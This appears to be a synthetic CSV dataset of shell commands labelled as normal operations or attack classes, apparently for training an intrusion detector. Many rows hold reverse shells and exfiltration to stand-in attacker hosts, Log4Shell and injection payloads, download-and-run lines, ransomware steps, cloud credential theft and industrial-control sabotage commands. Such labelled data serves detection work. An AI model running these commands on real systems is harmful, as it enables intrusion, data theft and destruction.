timestamp,src_ip,input,label
2026-01-20T18:06:49.616344,194.178.100.182,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.597537,56.140.11.74,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T18:06:49.602715,25.73.74.246,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T18:06:49.625345,174.108.130.176,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.583995,120.201.125.1,docker-compose up -d,Normal_Business_Ops
2026-01-20T18:06:49.649821,181.90.119.90,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.603716,7.215.95.98,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.624262,177.41.192.59,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.597537,121.244.251.188,whoami,Normal_Business_Ops
2026-01-20T18:06:49.608346,223.170.131.17,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T18:06:49.614343,153.98.211.83,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.646819,98.16.193.111,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.622713,186.156.31.117,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.625855,82.12.161.121,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.596536,215.75.149.18,git add .,Normal_Business_Ops
2026-01-20T18:06:49.586561,189.220.144.13,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T18:06:49.619742,127.144.79.176,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.652043,199.18.60.38,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.580022,10.6.74.217,whoami,Normal_Business_Ops
2026-01-20T18:06:49.632463,39.232.248.220,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.628852,4.142.173.8,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.596536,216.3.94.189,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T18:06:49.654031,136.75.246.75,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.576929,7.146.160.173,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T18:06:49.621712,192.37.103.152,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.589562,85.126.51.164,git log -n 5,Normal_Business_Ops
2026-01-20T18:06:49.634463,69.23.84.248,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.575395,128.104.226.132,netstat -tulpn,Normal_Business_Ops
2026-01-20T18:06:49.640252,195.129.232.47,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.587562,54.221.22.98,git add .,Normal_Business_Ops
2026-01-20T18:06:49.609343,91.122.236.48,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.643231,163.243.86.183,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.623750,221.99.81.86,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.599537,58.186.162.183,whoami,Normal_Business_Ops
2026-01-20T18:06:49.602715,15.123.234.43,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.635464,49.186.111.192,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.593923,173.33.164.194,git checkout -b feature-ai,Normal_Business_Ops
2026-01-20T18:06:49.577927,70.79.145.74,git fetch origin main,Normal_Business_Ops
2026-01-20T18:06:49.602715,103.46.116.90,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T18:06:49.586561,46.3.51.145,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.640252,108.103.86.200,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.605716,112.58.148.179,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.577927,105.15.216.251,git fetch origin main,Normal_Business_Ops
2026-01-20T18:06:49.597537,82.176.231.238,systemctl status docker,Normal_Business_Ops
2026-01-20T18:06:49.587562,130.141.43.13,npm start,Normal_Business_Ops
2026-01-20T18:06:49.577927,201.200.128.118,npm start,Normal_Business_Ops
2026-01-20T18:06:49.580995,175.232.199.166,whoami,Normal_Business_Ops
2026-01-20T18:06:49.656632,186.133.202.195,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.597537,13.56.150.234,ps -ef | grep python,Normal_Business_Ops
2026-01-20T18:06:49.615344,41.32.114.197,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.627851,94.139.60.153,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.601728,32.247.188.54,git branch,Normal_Business_Ops
2026-01-20T18:06:49.649821,21.227.107.254,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.582995,158.229.121.110,git branch,Normal_Business_Ops
2026-01-20T18:06:49.620713,138.190.109.122,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.627851,21.172.213.194,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.651526,81.205.137.241,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.591206,159.226.222.136,curl https://google.com,Normal_Business_Ops
2026-01-20T18:06:49.637464,219.49.190.111,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.621712,219.125.191.197,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.653031,217.76.63.112,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.583995,2.219.25.189,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T18:06:49.622713,100.98.235.2,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.640252,181.55.0.86,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.645231,216.181.179.46,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.655127,18.133.152.22,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.647820,206.103.188.52,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.582995,187.129.119.175,systemctl status docker,Normal_Business_Ops
2026-01-20T18:06:49.636464,206.203.220.3,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.655127,124.186.67.218,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.623750,194.90.85.147,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.576420,42.150.250.105,df -h,Normal_Business_Ops
2026-01-20T18:06:49.601728,140.72.179.18,git log -n 5,Normal_Business_Ops
2026-01-20T18:06:49.598537,27.16.137.74,ps -ef | grep python,Normal_Business_Ops
2026-01-20T18:06:49.588562,44.42.218.224,git remote -v,Normal_Business_Ops
2026-01-20T18:06:49.617074,157.59.125.254,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.655635,153.178.192.115,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.598537,200.190.50.213,df -h,Normal_Business_Ops
2026-01-20T18:06:49.578927,111.195.122.214,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T18:06:49.654031,127.28.24.223,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.580022,218.239.148.227,git pull,Normal_Business_Ops
2026-01-20T18:06:49.615344,15.26.13.67,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.626851,197.22.202.104,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.644231,216.230.211.218,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.580022,49.170.93.87,ps -ef | grep python,Normal_Business_Ops
2026-01-20T18:06:49.576420,167.77.197.161,git remote -v,Normal_Business_Ops
2026-01-20T18:06:49.582995,112.168.163.53,whoami,Normal_Business_Ops
2026-01-20T18:06:49.619742,115.241.46.48,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.648870,73.93.171.36,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.644231,10.35.102.155,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.585564,189.96.224.167,curl https://google.com,Normal_Business_Ops
2026-01-20T18:06:49.631464,189.126.81.208,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.626851,34.90.108.70,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.585564,30.247.2.182,git pull,Normal_Business_Ops
2026-01-20T18:06:49.643231,173.18.40.160,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.648870,61.159.3.12,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.620713,84.186.63.98,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.580022,32.78.194.143,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T18:06:49.629483,215.63.216.56,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.586561,32.126.97.249,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T18:06:49.644231,196.9.32.56,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.619055,54.156.244.166,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.608346,73.56.184.253,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T18:06:49.633463,61.114.209.169,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.620713,153.92.81.213,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.595541,47.18.218.225,go run main.go,Normal_Business_Ops
2026-01-20T18:06:49.608346,95.193.122.86,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T18:06:49.613343,86.47.111.137,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.625345,38.228.52.64,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.627851,206.50.112.234,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.616344,151.117.104.247,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.646819,76.227.255.176,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.614343,142.58.247.33,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.650820,96.28.109.230,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.647820,85.228.165.200,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.642230,160.200.19.50,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.583995,182.131.163.247,uptime,Normal_Business_Ops
2026-01-20T18:06:49.590224,130.194.82.160,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T18:06:49.632463,3.105.230.103,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.649821,56.32.132.55,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.633463,189.102.25.209,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.626851,66.184.220.181,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.589562,165.165.146.3,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T18:06:49.655127,12.153.26.52,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.601728,20.254.70.90,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.640252,78.189.124.82,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.575395,15.14.173.189,curl https://google.com,Normal_Business_Ops
2026-01-20T18:06:49.587562,133.244.73.127,git merge main,Normal_Business_Ops
2026-01-20T18:06:49.654619,191.9.116.18,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.628852,104.182.181.148,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.586561,74.180.70.50,uptime,Normal_Business_Ops
2026-01-20T18:06:49.596536,57.104.211.206,git fetch origin main,Normal_Business_Ops
2026-01-20T18:06:49.649821,39.107.72.239,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.594923,44.232.3.68,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T18:06:49.575395,130.60.1.74,git merge main,Normal_Business_Ops
2026-01-20T18:06:49.610343,75.158.70.194,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.609343,223.226.182.233,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.654619,205.124.161.82,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.639217,74.21.167.52,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.601211,23.161.165.237,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T18:06:49.590224,75.211.17.132,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T18:06:49.631464,113.4.70.80,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.575395,69.53.193.48,ps -ef | grep python,Normal_Business_Ops
2026-01-20T18:06:49.655635,163.145.111.71,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.581995,12.238.89.49,history | tail -n 20,Normal_Business_Ops
2026-01-20T18:06:49.644231,75.226.109.182,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.601728,55.51.201.70,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T18:06:49.585564,126.210.144.57,netstat -tulpn,Normal_Business_Ops
2026-01-20T18:06:49.655635,67.213.251.102,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.646819,128.207.63.202,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.585564,16.133.42.224,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T18:06:49.628852,17.38.189.27,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.649821,130.74.39.192,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.609343,41.64.48.86,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.625855,75.30.118.44,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.639720,74.125.149.155,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.631464,17.67.11.164,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.655635,71.92.64.147,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.628852,139.10.116.221,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.625855,188.101.100.20,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.612343,40.123.174.38,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.612343,112.161.94.151,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
